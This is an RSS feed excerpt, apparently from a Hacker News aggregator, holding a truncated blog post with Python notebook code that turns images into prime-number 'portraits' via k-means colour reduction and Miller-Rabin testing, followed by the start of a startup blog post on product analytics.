        <span>quotient</span><span>,</span> <span>remainder</span> <span>=</span> <span>divmod</span><span>(</span><span>d</span><span>,</span> <span>2</span><span>)</span>
        <span>if</span> <span>remainder</span> <span>==</span> <span>1</span><span>:</span>
            <span>break</span>
        <span>s</span> <span>+=</span> <span>1</span>
        <span>d</span> <span>=</span> <span>quotient</span>
    <span>assert</span><span>(</span><span>2</span><span>**</span><span>s</span> <span>*</span> <span>d</span> <span>==</span> <span>n</span><span>-</span><span>1</span><span>)</span>
                                     
    <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>mrpt_num_trials</span><span>):</span>
        <span>a</span> <span>=</span> <span>random</span><span>.</span><span>randrange</span><span>(</span><span>2</span><span>,</span> <span>n</span><span>)</span>
        <span>if</span> <span>try_composite</span><span>(</span><span>a</span><span>,</span> <span>d</span><span>,</span> <span>n</span><span>,</span> <span>s</span><span>):</span>
            <span>return</span> <span>False</span>
        
    <span>return</span> <span>True</span> <span># no base tested showed n as composite</span>

<span>assert</span> <span>is_probable_prime</span><span>(</span><span>2</span><span>)</span>
<span>assert</span> <span>is_probable_prime</span><span>(</span><span>3</span><span>)</span>
<span>assert</span> <span>not</span> <span>is_probable_prime</span><span>(</span><span>4</span><span>)</span>
<span>assert</span>  <span>is_probable_prime</span><span>(</span><span>5</span><span>)</span>
<span>assert</span> <span>not</span> <span>is_probable_prime</span><span>(</span><span>123456789</span><span>)</span>
<span>primes_under_1000</span> <span>=</span> <span>[</span><span>i</span> <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>2</span><span>,</span> <span>1000</span><span>)</span> <span>if</span> <span>is_probable_prime</span><span>(</span><span>i</span><span>)]</span>
<span>assert</span> <span>len</span><span>(</span><span>primes_under_1000</span><span>)</span> <span>==</span> <span>168</span>
<span>assert</span> <span>primes_under_1000</span><span>[</span><span>-</span><span>10</span><span>:]</span> <span>==</span> <span>[</span><span>937</span><span>,</span> <span>941</span><span>,</span> <span>947</span><span>,</span> <span>953</span><span>,</span> <span>967</span><span>,</span> <span>971</span><span>,</span> <span>977</span><span>,</span> <span>983</span><span>,</span> <span>991</span><span>,</span> <span>997</span><span>]</span>
<span>assert</span> <span>is_probable_prime</span><span>(</span><span>6438080068035544392301298549614926991513861075340134</span>\
<span>3291807343952413826484237063006136971539473913409092293733259038472039</span>\
<span>7133335969549256322620979036686633213903952966175107096769180017646161</span>\
<span>851573147596390153</span><span>)</span>
<span>assert</span> <span>not</span> <span>is_probable_prime</span><span>(</span><span>7438080068035544392301298549614926991513861075340134</span>\
<span>3291807343952413826484237063006136971539473913409092293733259038472039</span>\
<span>7133335969549256322620979036686633213903952966175107096769180017646161</span>\
<span>851573147596390153</span><span>)</span>
</pre>
</div>
</div>
</div>
</div>
</div>
<div>

<div>
<div>
<h2 id="Generating-the-images">Generating the images</h2>
<p>The basis of the algorithm is generating images with only 10 possible color values. I did not know what a common approach to this is, so I thought applying a <a href="https://en.wikipedia.org/wiki/K-means_clustering">k-means algorithm</a> would work. To do this, I reshaped an input image (so each pixel is a point in 3D space), clustered this, and used the 10 created clusters as color values. Sidenote: when your hammer is machine learning, everything looks like a nail…</p>
<p>Important for the prime generation is that you add a little bit of noise to the original image to create images that look the same, but are slightly different. This means that you created a different number, which is a new chance for us to find a prime number.</p>
</div>
</div>
</div>
<div>
<div>
<div>
<div>
<div>
<pre><span>def</span> <span>get_k_means</span><span>(</span><span>image</span><span>):</span>
    <span>pointcloud</span> <span>=</span> <span>np</span><span>.</span><span>reshape</span><span>(</span><span>image</span><span>,</span> <span>(</span><span>-</span><span>1</span><span>,</span> <span>3</span><span>))</span>
    <span>kmeans</span> <span>=</span> <span>KMeans</span><span>(</span><span>n_clusters</span><span>=</span><span>10</span><span>)</span><span>.</span><span>fit</span><span>(</span><span>pointcloud</span><span>)</span>
    <span>return</span> <span>kmeans</span>

<span>def</span> <span>create_numbered_image</span><span>(</span><span>image</span><span>,</span> <span>kmeans</span><span>):</span>
    <span>"""</span>
<span>    Turns an RGB image into an image with the labels of clusters of the supplied kmeans classifier. </span>
<span>    """</span>
    <span># apply noise</span>
    <span>stdev</span> <span>=</span> <span>np</span><span>.</span><span>std</span><span>(</span><span>image</span><span>)</span>
    <span>random_noise</span> <span>=</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>random_sample</span><span>(</span><span>size</span><span>=</span><span>image</span><span>.</span><span>shape</span><span>)</span><span>*</span><span>(</span><span>stdev</span><span>/</span><span>3</span><span>)</span>
    <span>image</span> <span>=</span> <span>image</span> <span>+</span> <span>random_noise</span>
    
    <span>orig_shape</span> <span>=</span> <span>image</span><span>.</span><span>shape</span>
    <span>image</span> <span>=</span> <span>np</span><span>.</span><span>reshape</span><span>(</span><span>image</span><span>,</span> <span>(</span><span>-</span><span>1</span><span>,</span> <span>3</span><span>))</span>

    <span>numbered_image</span> <span>=</span> <span>kmeans</span><span>.</span><span>predict</span><span>(</span><span>image</span><span>)</span>
    <span>numbered_image</span> <span>=</span> <span>np</span><span>.</span><span>reshape</span><span>(</span><span>numbered_image</span><span>,</span> <span>orig_shape</span><span>[:</span><span>2</span><span>])</span>
    
    <span># make sure the end is uneven</span>
    <span>if</span> <span>numbered_image</span><span>[</span><span>-</span><span>1</span><span>,</span><span>-</span><span>1</span><span>]</span><span>%</span><span>2</span><span>==</span><span>0</span><span>:</span>
        <span>numbered_image</span><span>[</span><span>-</span><span>1</span><span>,</span><span>-</span><span>1</span><span>]</span> <span>+=</span> <span>1</span>

    <span>return</span> <span>numbered_image</span>

<span>def</span> <span>numbered_image_to_normal_image</span><span>(</span><span>numbered_image</span><span>,</span> <span>kmeans</span><span>):</span>
    <span>"""</span>
<span>    Turns an image with only values between 0 and 9 into a colored image by using the cluster centers </span>
<span>    of the supplied kmeans classifier. </span>
<span>    """</span>
    <span>shape</span> <span>=</span> <span>(</span><span>numbered_image</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>],</span> <span>numbered_image</span><span>.</span><span>shape</span><span>[</span><span>1</span><span>],</span> <span>3</span><span>)</span>
    <span>image</span> <span>=</span> <span>np</span><span>.</span><span>zeros</span><span>(</span><span>shape</span><span>)</span>
    <span>for</span> <span>label</span><span>,</span> <span>color</span> <span>in</span> <span>zip</span><span>(</span><span>range</span><span>(</span><span>10</span><span>),</span> <span>kmeans</span><span>.</span><span>cluster_centers_</span><span>):</span>
        <span>image</span><span>[</span><span>numbered_image</span><span>==</span><span>label</span><span>]</span> <span>=</span> <span>color</span>
    <span>return</span> <span>image</span>
</pre>
</div>
</div>
</div>
</div>
</div>
<div>

<div>
<div>
<h3 id="Numerised-image-examples">Numerised image examples</h3>
<p>Here I create a few examples of small numerised images of the Mona Lisa. If you look closely you can see each image is slightly different, but you can still recognise the original picture. This is crucial for us, as this allows us to generate multiple numerised images that we can test for primality.</p>
</div>
</div>
</div>
<div>
<div>
<p>In&nbsp;[4]:</p>
<div>
<div>
<div>
<pre><span>def</span> <span>load_and_resize_image</span><span>(</span><span>filename</span><span>,</span> <span>resize_factor</span><span>=</span><span>18</span><span>):</span>
    <span>image</span> <span>=</span> <span>skimage</span><span>.</span><span>io</span><span>.</span><span>imread</span><span>(</span><span>filename</span><span>)</span>
    <span>image</span> <span>=</span> <span>image</span><span>.</span><span>astype</span><span>(</span><span>np</span><span>.</span><span>float64</span><span>)</span>
    <span>image</span> <span>=</span> <span>image</span> <span>/</span> <span>255.</span>
    
    <span>oldshape</span> <span>=</span> <span>image</span><span>.</span><span>shape</span>
    <span>with</span> <span>warnings</span><span>.</span><span>catch_warnings</span><span>():</span>
        <span>warnings</span><span>.</span><span>simplefilter</span><span>(</span><span>"ignore"</span><span>)</span>
        <span>resized_image</span> <span>=</span> <span>skimage</span><span>.</span><span>transform</span><span>.</span><span>resize</span><span>(</span><span>image</span><span>,</span> <span>(</span><span>oldshape</span><span>[</span><span>0</span><span>]</span><span>//</span><span>resize_factor</span><span>,</span> <span>oldshape</span><span>[</span><span>1</span><span>]</span><span>//</span><span>resize_factor</span><span>))</span>

    <span>return</span> <span>resized_image</span>

<span>resized_image</span> <span>=</span> <span>load_and_resize_image</span><span>(</span><span>'input_pictures/monalisa.jpg'</span><span>)</span>
<span>kmeans</span> <span>=</span> <span>get_k_means</span><span>(</span><span>resized_image</span><span>)</span>
<span>N_IMAGES</span> <span>=</span> <span>3</span>

<span>f</span><span>,</span> <span>axarr</span> <span>=</span> <span>plt</span><span>.</span><span>subplots</span><span>(</span><span>1</span><span>,</span><span>N_IMAGES</span><span>)</span>

<span>for</span> <span>index</span> <span>in</span> <span>range</span><span>(</span><span>N_IMAGES</span><span>):</span>
    <span>n_image</span> <span>=</span> <span>create_numbered_image</span><span>(</span><span>resized_image</span><span>,</span> <span>kmeans</span><span>)</span>
    <span>normal_image</span> <span>=</span> <span>numbered_image_to_normal_image</span><span>(</span><span>n_image</span><span>,</span> <span>kmeans</span><span>)</span>
    <span>axarr</span><span>[</span><span>index</span><span>]</span><span>.</span><span>imshow</span><span>(</span><span>normal_image</span><span>)</span>
</pre>
</div>
</div>
</div>
</div>
<div>
<div>
<div>

<p><img src="data:image/png;base64,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 atd+WFW0KO3la4INg/a+Rx8sbxa1NH58xdI5b3/iP6otjFsS5hrYtOy94tgw5RpdKVNB5o8++HJx LMw1GHvo8e9Fs5mXxWMetieWhLlGbaxLy1cBbdzxGqia64aLyvf5Tx3uu+0ZupndbWaHzOylWbct N7PHzGxP6+v5He4PDUK2OZHr6OrkLZetkq7/0G1flfSEu6+T9ETrZwyfrSLbjLaKXEdS24Lu7s9I Ovyhm2+UdE/r+3skfb7meaEPyDYnch1dVd9DX+nuB1rfvyWp+LlcM9ssabMknbO4fyvloLKOsiXX oUOuI6DrLhd3d0kejG9x9wl3n/jIGC+QYRJlS67Di1zzqlrQD5rZKklqfZ1/iwOaimxzItcRUPUt l4cl3SLpjtbXh7qdSNSaGNk9WT6LqNJy1UtP7Sq3Cx46cqI4tmJZ+Sp0ax94sjh2/PLL57z92E/L V6dTzdlWzTV6rq69Ipx/3zUl1zbIdZ6GJNcP6KRt8X5J35X0CTPbZ2a3auZF8Vkz2yPpM62fMWTI NidyHV1tz9Dd/ebC0Kdrngv6jGxzItfRxUf/ASAJCjoAJEFBB4AkKOgAkAQFHQCS6Ovlc09MWblv PLiMZWR87Yri2L5guz9/qPy5ivHdu8v3aeX9SdLeoHd19dLTxbFrryj30z+1q7y/sK9Xcz+Os06U e2irOHrCgnlUy3V1cCnVKIMo10iUuRQ/z/3O9TI7Ut6wRr3I9bIrR/t4jT43M15DrpyhA0ASFHQA SIKCDgBJUNABIAkKOgAkQUEHgCT62rYYrSIeXY7zznvfDu61fKnKqO0ocjhoddq7s7y/bkRtapHo MZYux3n6+z+utK+Ssxcv1GVXzr3m8IYN5ZfYfdsOFsf2Hw3ONYIMLitvFXqu4vPfTi9yXb5uWXnD xyvtbk5LF3vxkrbR8RrnWu34iXIdpuN1fO0FxbE6cuUMHQCSoKADQBIUdABIgoIOAElQ0AEgCQo6 ACTR17bFkxorXv3sqaA1sdQSJ0nH95Vb8KLWt9XBdrHqfwNfePNkcWzFssWV7jN6jON75r562/SJ uVtHeyFqYYtauKJ8osccvR5i/c81WjleKm9XyrVu0fG6O0muUQaHgqd5/YWLimPR44jaKKu23M7G GToAJEFBB4AkKOgAkAQFHQCSoKADQBIUdABIom3bopndLelXJR1y959v3fZnkn5P0plew6+5+yPd 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 rkJggg=="></p>
</div>
</div>
</div>
</div>
<div>

<div>
<div>
<h2 id="Helper-functions">Helper functions</h2>
<p>I had to create some helper functions to return strings, integers, and load and show images.</p>
</div>
</div>
</div>
<div>
<div>
<div>
<div>
<div>
<pre><span>def</span> <span>image_to_number</span><span>(</span><span>numbered_image</span><span>):</span>
    <span>to_be_number</span> <span>=</span> <span>numbered_image</span><span>.</span><span>reshape</span><span>(</span><span>-</span><span>1</span><span>)</span>
    <span>as_string</span> <span>=</span> <span>''</span><span>.</span><span>join</span><span>([</span><span>str</span><span>(</span><span>int</span><span>(</span><span>x</span><span>))</span> <span>for</span> <span>x</span> <span>in</span> <span>to_be_number</span><span>])</span>
    <span>as_int</span> <span>=</span> <span>int</span><span>(</span><span>as_string</span><span>)</span>
    <span>return</span> <span>as_int</span><span>,</span> <span>as_string</span>


<span>def</span> <span>show_and_save_image</span><span>(</span><span>image</span><span>,</span> <span>n_image</span><span>,</span> <span>filename</span><span>,</span> <span>fontsize</span><span>=</span><span>16</span><span>):</span>
    <span>oldshape</span> <span>=</span> <span>image</span><span>.</span><span>shape</span>
    <span>resized_image</span><span>=</span> <span>scipy</span><span>.</span><span>misc</span><span>.</span><span>imresize</span><span>(</span><span>image</span><span>,(</span><span>oldshape</span><span>[</span><span>0</span><span>]</span><span>*</span><span>fontsize</span><span>,</span> <span>oldshape</span><span>[</span><span>1</span><span>]</span><span>*</span><span>fontsize</span><span>),</span> <span>interp</span><span>=</span><span>'nearest'</span><span>)</span>
    <span>img</span> <span>=</span> <span>Image</span><span>.</span><span>fromarray</span><span>(</span><span>resized_image</span><span>)</span><span>.</span><span>convert</span><span>(</span><span>"RGBA"</span><span>)</span>
    <span>txt</span> <span>=</span> <span>Image</span><span>.</span><span>new</span><span>(</span><span>'RGBA'</span><span>,</span> <span>img</span><span>.</span><span>size</span><span>,</span> <span>(</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>0</span><span>))</span>

    <span>draw</span> <span>=</span> <span>ImageDraw</span><span>.</span><span>Draw</span><span>(</span><span>txt</span><span>)</span>
    <span>font</span> <span>=</span> <span>ImageFont</span><span>.</span><span>truetype</span><span>(</span><span>"pirulen rg.ttf"</span><span>,</span> <span>fontsize</span><span>)</span>
    <span>for</span> <span>y_i</span><span>,</span> <span>totype</span> <span>in</span> <span>enumerate</span><span>(</span><span>n_image</span><span>):</span>
        <span>for</span> <span>x_i</span><span>,</span> <span>letter</span> <span>in</span> <span>enumerate</span><span>(</span><span>totype</span><span>):</span>
            <span>xpos</span> <span>=</span> <span>x_i</span> <span>*</span> <span>fontsize</span> <span>+</span> <span>1</span>
            <span>ypos</span> <span>=</span> <span>y_i</span> <span>*</span> <span>fontsize</span>
            <span>if</span> <span>letter</span> <span>==</span> <span>1</span><span>:</span>
                <span>xpos</span> <span>+=</span> <span>4</span>
            <span>draw</span><span>.</span><span>text</span><span>((</span><span>xpos</span><span>,</span> <span>ypos</span><span>),</span><span>str</span><span>(</span><span>letter</span><span>),(</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span> <span>128</span><span>),</span><span>font</span><span>=</span><span>font</span><span>)</span>
    <span>img</span> <span>=</span> <span>Image</span><span>.</span><span>alpha_composite</span><span>(</span><span>img</span><span>,</span> <span>txt</span><span>)</span>    

    <span>img</span><span>.</span><span>save</span><span>(</span><span>filename</span><span>)</span>
    <span>plt</span><span>.</span><span>figure</span><span>(</span><span>figsize</span><span>=</span><span>(</span><span>20</span><span>,</span><span>20</span><span>))</span>
    <span>plt</span><span>.</span><span>imshow</span><span>(</span><span>img</span><span>)</span>
    <span>plt</span><span>.</span><span>show</span><span>()</span>

<span>def</span> <span>result_filename</span><span>(</span><span>filename</span><span>):</span>
    <span>return</span> <span>filename</span><span>.</span><span>split</span><span>(</span><span>'.'</span><span>)[</span><span>0</span><span>]</span> <span>+</span> <span>"-prime.png"</span>
</pre>
</div>
</div>
</div>
</div>
</div>
<div>

<div>
<p>To verify if something is a good prime portrait I made the following helper functions:</p>
</div>
</div>
<div>
<div>
<div>
<div>
<div>
<pre><span>def</span> <span>is_good_prime_portrait</span><span>(</span><span>n_image</span><span>):</span>
    <span>integer</span><span>,</span> <span>string</span> <span>=</span> <span>image_to_number</span><span>(</span><span>n_image</span><span>)</span>
    <span>if</span> <span>is_probable_prime</span><span>(</span><span>integer</span><span>):</span> 
        <span>return</span> <span>integer</span><span>,</span> <span>string</span><span>,</span> <span>n_image</span>
    <span>else</span><span>:</span>
        <span>return</span> <span>None</span>
    
    
<span>def</span> <span>print_result</span><span>(</span><span>string</span><span>,</span> <span>n_image</span><span>):</span>
    <span>print</span><span>(</span><span>string</span><span>)</span>
    <span>print</span><span>(</span><span>"-"</span><span>*</span><span>100</span><span>)</span>
    <span>for</span> <span>line</span> <span>in</span> <span>n_image</span><span>:</span>
        <span>print</span><span>(</span><span>''</span><span>.</span><span>join</span><span>([</span><span>str</span><span>(</span><span>x</span><span>)</span> <span>for</span> <span>x</span> <span>in</span> <span>line</span><span>]))</span>
</pre>
</div>
</div>
</div>
</div>
</div>
<div>

<div>
<div>
<h2 id="Multi-threaded-searching">Multi threaded searching</h2>
<p>At first I created a single-threaded solution, which worked. However, my laptop has multiple cores and could work on multiple numbers at the same time, so I rewrote my initial approach in a multi-threaded fashion:</p>
</div>
</div>
</div>
<div>
<div>
<div>
<div>
<div>
<pre><span>def</span> <span>print_result</span><span>(</span><span>string</span><span>,</span> <span>n_image</span><span>):</span>
    <span>print</span><span>(</span><span>"Found a result: "</span> <span>+</span> <span>"-"</span><span>*</span><span>100</span><span>)</span>
    <span>print</span><span>(</span><span>string</span><span>)</span>
    <span>print</span><span>(</span><span>"Represented as portrait:"</span> <span>+</span> <span>"-"</span><span>*</span><span>100</span><span>)</span>
    <span>for</span> <span>line</span> <span>in</span> <span>n_image</span><span>:</span>
        <span>print</span><span>(</span><span>''</span><span>.</span><span>join</span><span>([</span><span>str</span><span>(</span><span>x</span><span>)</span> <span>for</span> <span>x</span> <span>in</span> <span>line</span><span>]))</span>

<span>def</span> <span>multi_threaded_prime_generator</span><span>(</span><span>resized_image</span><span>,</span> <span>kmeans</span><span>,</span> <span>filename</span><span>,</span> <span>threads</span><span>=</span><span>4</span><span>,</span> <span>log_process</span><span>=</span><span>True</span><span>):</span>
    <span>image_generator</span> <span>=</span> <span>(</span><span>create_numbered_image</span><span>(</span><span>resized_image</span><span>,</span> <span>kmeans</span><span>)</span> <span>for</span> <span>_</span> <span>in</span> <span>range</span><span>(</span><span>1000000</span><span>))</span>
    <span>start</span> <span>=</span> <span>time</span><span>.</span><span>time</span><span>()</span> 
    <span>with</span> <span>Pool</span><span>(</span><span>threads</span><span>)</span> <span>as</span> <span>pool</span><span>:</span>
        <span>results</span> <span>=</span> <span>pool</span><span>.</span><span>imap_unordered</span><span>(</span><span>is_good_prime_portrait</span><span>,</span> <span>image_generator</span><span>)</span>
        <span>total_results</span> <span>=</span> <span>0</span>
        
        <span>for</span> <span>result</span> <span>in</span> <span>results</span><span>:</span>
            <span>total_results</span> <span>+=</span> <span>1</span>
            
            <span># Possibly log time spend searching this prime number</span>
            <span>if</span> <span>log_process</span> <span>and</span> <span>total_results</span><span>%</span><span>30</span><span>==</span><span>0</span><span>:</span>
                <span>elapsed</span> <span>=</span> <span>time</span><span>.</span><span>time</span><span>()</span>
                <span>elapsed</span> <span>=</span> <span>elapsed</span> <span>-</span> <span>start</span>
                <span>print</span><span>(</span><span>"Seconds spent in (function name) is </span><span>{}</span><span> time per result: </span><span>{}</span><span>"</span><span>.</span><span>format</span><span>(</span><span>str</span><span>(</span><span>elapsed</span><span>),</span> <span>str</span><span>(</span><span>elapsed</span><span>/</span><span>total_results</span><span>)))</span>

                
            <span>if</span> <span>result</span> <span>!=</span> <span>None</span><span>:</span> 
 …</pre></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.pinchofintelligence.com/painting-by-prime-number/">http://www.pinchofintelligence.com/painting-by-prime-number/</a></em></p>]]>
            </description>
            <link>http://www.pinchofintelligence.com/painting-by-prime-number/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25504887</guid>
            <pubDate>Tue, 22 Dec 2020 10:36:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[From product analytics to product observability]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25504778">thread link</a>) | @bastienbeurier
<br/>
December 22, 2020 | https://www.lantern.so/blog/from-product-analytics-to-product-observability | <a href="https://web.archive.org/web/*/https://www.lantern.so/blog/from-product-analytics-to-product-observability">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Early ventures don't start with optimization. You begin with a big, bold bet that whatever you’re going to make will cause a revolution. Your product goes through several iterations, entirely transforming throughout the process. You test the strength of a founder's dream.</p><p>Products at this stage are simple, characterized by one 'killer' feature. Often the product doesn't have the chance to fulfill the advertised value and that's okay. The goal at this stage is to validate the appetite of the users: attract them, disappoint them, and leave them hungry for more.</p><p>Product development in this context is chaotic. No roadmap, mostly negative feedback, no clear sense of progress, and definitely no certainty when the next pivot will come. No one knows how the product will look in a month. It's the 'build things that don't scale' phase, taking shortcuts that somewhat work and dealing with most problems later.</p><p>This is where your headlight comes in: product analytics. You use product analytics to drill down what works and what 